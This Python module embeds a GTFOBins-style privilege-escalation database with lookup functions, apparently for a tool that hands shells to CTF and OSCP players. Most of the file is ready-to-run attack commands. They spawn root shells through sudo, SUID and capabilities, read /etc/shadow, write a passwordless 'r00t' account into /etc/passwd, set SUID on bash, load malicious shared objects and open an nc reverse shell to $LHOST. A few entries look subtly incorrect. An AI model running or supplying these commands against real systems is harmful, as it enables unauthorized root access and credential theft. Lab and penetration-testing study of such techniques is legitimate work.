"""
Embedded GTFOBins knowledge base.

Compact subset of gtfobins.github.io focused on the binaries that actually
show up in HTB/OSCP privesc paths. Each entry carries only the exploitation
primitives that escalate privilege (sudo / suid / capabilities / limited
shell escapes). File-read/file-write/network modes are out of scope — a
privesc-focused MCP should return a shell, not hint at tangential tricks.

Mode keys:
  sudo         command(s) for `sudo -l` NOPASSWD / allowed binary
  suid         command(s) when SUID root bit is set
  capabilities sequence of {cap → exec} mappings
  limited      escape from restricted shell once already executed as root
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, List, Optional


@dataclass
class GTFOEntry:
    binary: str
    sudo: Optional[str] = None
    suid: Optional[str] = None
    capabilities: Optional[Dict[str, str]] = None  # cap name → command
    limited: Optional[str] = None
    notes: Optional[str] = None


# NOTE: commands assume /bin/sh target. Replace with /bin/bash if /bin/sh is
# dash-symlinked and you need bash features. For SUID, add `-p` when the
# binary honours the SUID bit only with `-p`.
_DB: Dict[str, GTFOEntry] = {
    "awk": GTFOEntry(
        "awk",
        sudo="sudo awk 'BEGIN {system(\"/bin/sh\")}'",
        suid="awk 'BEGIN {system(\"/bin/sh\")}'",
    ),
    "base64": GTFOEntry(
        "base64",
        sudo="LFILE=/etc/shadow; sudo base64 \"$LFILE\" | base64 -d",
        suid="LFILE=/etc/shadow; base64 \"$LFILE\" | base64 -d",
        notes="File read only — chain with crackable /etc/shadow.",
    ),
    "bash": GTFOEntry(
        "bash",
        sudo="sudo bash",
        suid="bash -p",
    ),
    "busybox": GTFOEntry(
        "busybox",
        sudo="sudo busybox sh",
        suid="busybox sh",
    ),
    "cat": GTFOEntry(
        "cat",
        sudo="LFILE=/etc/shadow; sudo cat \"$LFILE\"",
        suid="LFILE=/etc/shadow; cat \"$LFILE\"",
        capabilities={"cap_dac_read_search": "cat /etc/shadow"},
    ),
    "chmod": GTFOEntry(
        "chmod",
        sudo="sudo chmod u+s /bin/bash && /bin/bash -p",
        suid="chmod u+s /bin/bash && /bin/bash -p",
    ),
    "chown": GTFOEntry(
        "chown",
        sudo="sudo chown $(id -u):$(id -g) /etc/shadow",
        suid="chown root: /etc/passwd  # then edit to add root-uid user",
        capabilities={"cap_chown": "chown $(id -u) /etc/shadow"},
    ),
    "chroot": GTFOEntry(
        "chroot",
        sudo="sudo chroot / /bin/sh",
        suid="chroot / /bin/sh",
    ),
    "cp": GTFOEntry(
        "cp",
        sudo="echo 'r00t::0:0::/root:/bin/bash' | sudo cp /dev/stdin /etc/passwd",
        suid="cp /bin/bash /tmp/rbash; chmod u+s /tmp/rbash; /tmp/rbash -p",
    ),
    "curl": GTFOEntry(
        "curl",
        sudo="sudo curl file:///etc/shadow",
        suid="curl file:///etc/shadow",
        capabilities={"cap_dac_read_search": "curl file:///etc/shadow"},
    ),
    "dash": GTFOEntry("dash", sudo="sudo dash", suid="dash -p"),
    "date": GTFOEntry(
        "date",
        sudo="LFILE=/etc/shadow; sudo date -f \"$LFILE\"",
        notes="File read via error message only.",
    ),
    "dd": GTFOEntry(
        "dd",
        sudo="echo 'r00t::0:0::/root:/bin/bash' | sudo dd of=/etc/passwd",
        suid="echo 'r00t::0:0::/root:/bin/bash' | dd of=/etc/passwd",
    ),
    "docker": GTFOEntry(
        "docker",
        sudo="sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        limited="docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        notes="Membership in 'docker' group = root equivalent.",
    ),
    "env": GTFOEntry("env", sudo="sudo env /bin/sh", suid="env /bin/sh"),
    "expect": GTFOEntry(
        "expect",
        sudo="sudo expect -c 'spawn /bin/sh; interact'",
        suid="expect -c 'spawn /bin/sh; interact'",
    ),
    "find": GTFOEntry(
        "find",
        sudo="sudo find . -exec /bin/sh \\; -quit",
        suid="find . -exec /bin/sh -p \\; -quit",
    ),
    "flock": GTFOEntry(
        "flock",
        sudo="sudo flock -u / /bin/sh",
        suid="flock -u / /bin/sh -p",
    ),
    "gawk": GTFOEntry(
        "gawk",
        sudo="sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
        suid="gawk 'BEGIN {system(\"/bin/sh\")}'",
    ),
    "gcc": GTFOEntry(
        "gcc",
        sudo="sudo gcc -wrapper /bin/sh,-s .",
        suid="gcc -wrapper /bin/sh,-s .",
    ),
    "gdb": GTFOEntry(
        "gdb",
        sudo="sudo gdb -nx -ex '!sh' -ex quit",
        suid="gdb -nx -ex 'python import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-p\")' -ex quit",
    ),
    "git": GTFOEntry(
        "git",
        sudo="sudo git -p help config # then !/bin/sh",
        suid="git -p help config  # then !/bin/sh",
        notes="Alternative: `sudo git branch --help config` and run `!/bin/sh`.",
    ),
    "grep": GTFOEntry(
        "grep",
        sudo="LFILE=/etc/shadow; sudo grep '' \"$LFILE\"",
        capabilities={"cap_dac_read_search": "grep '' /etc/shadow"},
    ),
    "gzip": GTFOEntry(
        "gzip",
        sudo="LFILE=/etc/shadow; sudo gzip -f \"$LFILE\" -t",
        notes="File read via error message.",
    ),
    "iptables": GTFOEntry(
        "iptables",
        capabilities={"cap_net_admin,cap_net_raw": "iptables rules for lateral movement"},
    ),
    "ionice": GTFOEntry("ionice", sudo="sudo ionice /bin/sh", suid="ionice /bin/sh"),
    "jjs": GTFOEntry(
        "jjs",
        sudo="echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh . echo sh -i').waitFor()\" | sudo jjs",
    ),
    "journalctl": GTFOEntry(
        "journalctl",
        sudo="sudo journalctl  # then !/bin/sh inside the pager",
        notes="Requires less/more pager — shrink terminal to trigger pager.",
    ),
    "less": GTFOEntry(
        "less",
        sudo="sudo less /etc/profile  # then !/bin/sh",
        suid="less /etc/profile  # then !/bin/sh",
    ),
    "ln": GTFOEntry(
        "ln",
        sudo="sudo ln -sf /bin/bash /tmp/xyz  # only useful with other tricks",
        capabilities={"cap_dac_read_search": "symlink abuse"},
    ),
    "ls": GTFOEntry(
        "ls",
        capabilities={"cap_dac_read_search": "list protected dirs"},
    ),
    "lua": GTFOEntry(
        "lua",
        sudo="sudo lua -e 'os.execute(\"/bin/sh\")'",
        suid="lua -e 'os.execute(\"/bin/sh\")'",
    ),
    "make": GTFOEntry(
        "make",
        sudo="COMMAND='/bin/sh'; sudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"",
        suid="COMMAND='/bin/sh -p'; make -s --eval=$'x:\\n\\t-'\"$COMMAND\"",
    ),
    "man": GTFOEntry(
        "man",
        sudo="sudo man man  # then !/bin/sh",
        suid="man man  # then !/bin/sh",
    ),
    "mawk": GTFOEntry(
        "mawk",
        sudo="sudo mawk 'BEGIN {system(\"/bin/sh\")}'",
        suid="mawk 'BEGIN {system(\"/bin/sh\")}'",
    ),
    "more": GTFOEntry(
        "more",
        sudo="TERM= sudo more /etc/profile  # then !/bin/sh",
        suid="TERM= more /etc/profile  # then !/bin/sh",
    ),
    "mount": GTFOEntry(
        "mount",
        sudo="sudo mount -o bind /bin/sh /bin/mount  # rare; usually pair with umount tricks",
    ),
    "mv": GTFOEntry(
        "mv",
        sudo="echo 'r00t::0:0::/root:/bin/bash' > /tmp/p; sudo mv /tmp/p /etc/passwd",
        suid="mv malicious_file /etc/cron.d/0owned",
    ),
    "mysql": GTFOEntry(
        "mysql",
        sudo="sudo mysql -e '\\! /bin/sh'",
        suid="mysql -e '\\! /bin/sh'",
    ),
    "nano": GTFOEntry(
        "nano",
        sudo="sudo nano  # ctrl-R ctrl-X then: reset; sh 1>&0 2>&0",
        suid="nano  # same escape sequence",
    ),
    "nc": GTFOEntry(
        "nc",
        sudo="sudo nc -e /bin/sh $LHOST $LPORT",
        suid="nc -e /bin/sh -p $LHOST $LPORT",
        capabilities={"cap_net_bind_service": "bind low ports for pivoting"},
    ),
    "nmap": GTFOEntry(
        "nmap",
        sudo="sudo nmap --interactive  # then !sh  (old nmap only)",
        suid="echo 'os.execute(\"/bin/sh\")' > /tmp/e.nse; nmap --script=/tmp/e.nse",
    ),
    "node": GTFOEntry(
        "node",
        sudo="sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
        suid="node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
    ),
    "openssl": GTFOEntry(
        "openssl",
        sudo="sudo openssl req -engine ./my_engine.so  # load shared object as root",
        suid="openssl enc -in /etc/shadow  # file read",
    ),
    "perl": GTFOEntry(
        "perl",
        sudo="sudo perl -e 'exec \"/bin/sh\";'",
        suid="perl -e 'exec \"/bin/sh\";'",
        capabilities={"cap_setuid+ep": "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/sh\";'"},
    ),
    "php": GTFOEntry(
        "php",
        sudo="CMD='/bin/sh'; sudo php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
        suid="CMD='/bin/sh'; php -r \"pcntl_exec('/bin/sh', ['-p']);\"",
    ),
    "pip": GTFOEntry(
        "pip",
        sudo="TF=$(mktemp -d); echo 'import os; os.execl(\"/bin/sh\",\"sh\")' > $TF/setup.py; sudo pip install $TF",
    ),
    "pkexec": GTFOEntry(
        "pkexec",
        sudo="sudo pkexec /bin/sh",
        suid="# Check CVE-2021-4034 (PwnKit) — unpatched pkexec == root",
        notes="Even without sudo, an SUID pkexec with glibc < patched == CVE-2021-4034.",
    ),
    "puppet": GTFOEntry(
        "puppet",
        sudo="echo 'exec { \"/bin/sh\": }' | sudo puppet apply",
    ),
    "python": GTFOEntry(
        "python",
        sudo="sudo python -c 'import os; os.system(\"/bin/sh\")'",
        suid="python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        capabilities={"cap_setuid+ep": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    ),
    "python3": GTFOEntry(
        "python3",
        sudo="sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
        suid="python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
        capabilities={"cap_setuid+ep": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    ),
    "rsync": GTFOEntry(
        "rsync",
        sudo="sudo rsync -e 'sh -c \"/bin/sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
        suid="rsync -e 'sh -c \"/bin/sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    ),
    "ruby": GTFOEntry(
        "ruby",
        sudo="sudo ruby -e 'exec \"/bin/sh\"'",
        suid="ruby -e 'Process::UID.change_privilege(0); exec \"/bin/sh\"'",
    ),
    "scp": GTFOEntry(
        "scp",
        sudo="sudo scp -S /bin/sh x y:",
        notes="Uses SSH cmd hook.",
    ),
    "screen": GTFOEntry(
        "screen",
        sudo="sudo screen",
        suid="screen",
        notes="Older versions (4.5.0) have CVE-2017-5618 — SUID screen == root.",
    ),
    "sed": GTFOEntry(
        "sed",
        sudo="sudo sed -n '1e exec sh 1>&0' /etc/hostname",
        suid="sed -n '1e exec sh 1>&0' /etc/hostname",
    ),
    "service": GTFOEntry(
        "service",
        sudo="sudo service ../../bin/sh",
    ),
    "setarch": GTFOEntry(
        "setarch",
        sudo="sudo setarch $(arch) /bin/sh",
        suid="setarch $(arch) /bin/sh -p",
    ),
    "smbclient": GTFOEntry(
        "smbclient",
        sudo="sudo smbclient '\\\\\\\\x\\\\y' -c '!/bin/sh'",
    ),
    "socat": GTFOEntry(
        "socat",
        sudo="sudo socat stdin exec:/bin/sh",
        suid="socat stdin exec:'/bin/sh -p'",
        capabilities={"cap_net_bind_service": "bind <1024 for pivot"},
    ),
    "sqlite3": GTFOEntry(
        "sqlite3",
        sudo="sudo sqlite3 /dev/null '.shell /bin/sh'",
        suid="sqlite3 /dev/null '.shell /bin/sh'",
    ),
    "ssh": GTFOEntry(
        "ssh",
        sudo="sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    ),
    "ssh-keygen": GTFOEntry(
        "ssh-keygen",
        sudo="sudo ssh-keygen -D ./malicious.so",
        notes="Loads arbitrary shared object.",
    ),
    "strace": GTFOEntry(
        "strace",
        sudo="sudo strace -o /dev/null /bin/sh",
        suid="strace -o /dev/null /bin/sh -p",
    ),
    "su": GTFOEntry(
        "su",
        sudo="sudo su",
        suid="# Non-standard; su usually already SUID. If shadow is readable → crack + su.",
    ),
    "systemctl": GTFOEntry(
        "systemctl",
        sudo=(
            "TF=$(mktemp).service\n"
            "printf '[Service]\\nType=oneshot\\nExecStart=/bin/sh -c \"chmod +s /bin/bash\"\\n[Install]\\nWantedBy=multi-user.target' > $TF\n"
            "sudo systemctl link $TF && sudo systemctl enable --now $(basename $TF)"
        ),
    ),
    "tar": GTFOEntry(
        "tar",
        sudo="sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
        suid="tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/sh -p'",
    ),
    "tcpdump": GTFOEntry(
        "tcpdump",
        sudo=(
            "COMMAND='id'\n"
            "TF=$(mktemp); echo \"$COMMAND\" > $TF; chmod +x $TF\n"
            "sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root"
        ),
    ),
    "tee": GTFOEntry(
        "tee",
        sudo="echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd",
    ),
    "tmux": GTFOEntry(
        "tmux",
        sudo="sudo tmux",
    ),
    "top": GTFOEntry(
        "top",
        suid="# Launch top, then type 'e' and '!/bin/sh' in older versions",
    ),
    "unsquashfs": GTFOEntry(
        "unsquashfs",
        sudo="# extract into /etc with malicious files",
    ),
    "vi": GTFOEntry(
        "vi",
        sudo="sudo vi -c ':!/bin/sh' /dev/null",
        suid="vi -c ':!/bin/sh' /dev/null",
    ),
    "view": GTFOEntry(
        "view",
        sudo="sudo view -c ':!/bin/sh' /dev/null",
        suid="view -c ':!/bin/sh' /dev/null",
    ),
    "vim": GTFOEntry(
        "vim",
        sudo="sudo vim -c ':!/bin/sh' /dev/null",
        suid="vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
        capabilities={"cap_setuid+ep": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\",\"sh\",\"-p\")'"},
    ),
    "wget": GTFOEntry(
        "wget",
        sudo="TF=$(mktemp); chmod +x $TF; echo '/bin/sh 0<&2 1>&2' > $TF; sudo wget --use-askpass=$TF 0",
        capabilities={"cap_dac_read_search": "wget file:///etc/shadow"},
    ),
    "xxd": GTFOEntry(
        "xxd",
        sudo="LFILE=/etc/shadow; sudo xxd \"$LFILE\" | xxd -r",
        capabilities={"cap_dac_read_search": "xxd /etc/shadow"},
    ),
    "zip": GTFOEntry(
        "zip",
        sudo="TF=$(mktemp -u); sudo zip $TF /etc/hosts -T -TT 'sh #'",
        suid="TF=$(mktemp -u); zip $TF /etc/hosts -T -TT 'sh #'",
    ),
    "zsh": GTFOEntry("zsh", sudo="sudo zsh", suid="zsh"),
}


# Friendly aliases
_ALIASES = {
    "/bin/bash": "bash",
    "/usr/bin/bash": "bash",
    "/bin/sh": "dash",
    "/bin/dash": "dash",
    "/usr/bin/dash": "dash",
    "/bin/vi": "vi",
    "/usr/bin/vi": "vi",
    "/usr/bin/vim": "vim",
    "/usr/bin/vim.basic": "vim",
    "/usr/bin/vim.tiny": "vim",
    "/usr/bin/python": "python",
    "/usr/bin/python3": "python3",
    "/usr/bin/perl": "perl",
    "/usr/bin/awk": "awk",
    "/usr/bin/find": "find",
    "/usr/bin/tar": "tar",
    "/usr/bin/less": "less",
    "/usr/bin/more": "more",
    "/usr/bin/man": "man",
    "/usr/bin/nmap": "nmap",
    "/usr/sbin/tcpdump": "tcpdump",
    "/usr/bin/nano": "nano",
    "/usr/bin/pkexec": "pkexec",
}


def normalize(name: str) -> str:
    """Canonicalize a binary path/name to a DB key."""
    name = name.strip()
    if name in _ALIASES:
        return _ALIASES[name]
    # strip directory
    base = name.rsplit("/", 1)[-1]
    # strip arch suffixes (vim.basic → vim)
    return base.split(".")[0].lower()


def lookup(binary: str, modes: Optional[List[str]] = None) -> Dict[str, object]:
    """
    Return GTFOBins info for a single binary.

    Args:
        binary: name or absolute path
        modes:  subset of {"sudo","suid","capabilities","limited","notes"};
                None → all populated fields
    """
    key = normalize(binary)
    entry = _DB.get(key)
    if entry is None:
        return {"binary": binary, "found": False}

    wanted = set(modes) if modes else None
    out: Dict[str, object] = {"binary": key, "found": True}
    for field_name in ("sudo", "suid", "capabilities", "limited", "notes"):
        val = getattr(entry, field_name)
        if val is None:
            continue
        if wanted and field_name not in wanted:
            continue
        out[field_name] = val
    return out


def bulk_lookup(binaries: List[str], modes: Optional[List[str]] = None) -> Dict[str, object]:
    """Look up multiple binaries, splitting known vs unknown."""
    known: Dict[str, object] = {}
    unknown: List[str] = []
    for b in binaries:
        r = lookup(b, modes=modes)
        if r.get("found"):
            known[r["binary"]] = {k: v for k, v in r.items() if k not in ("binary", "found")}
        else:
            unknown.append(b)
    return {"known": known, "unknown": unknown, "count": len(known)}


def all_binaries() -> List[str]:
    return sorted(_DB.keys())
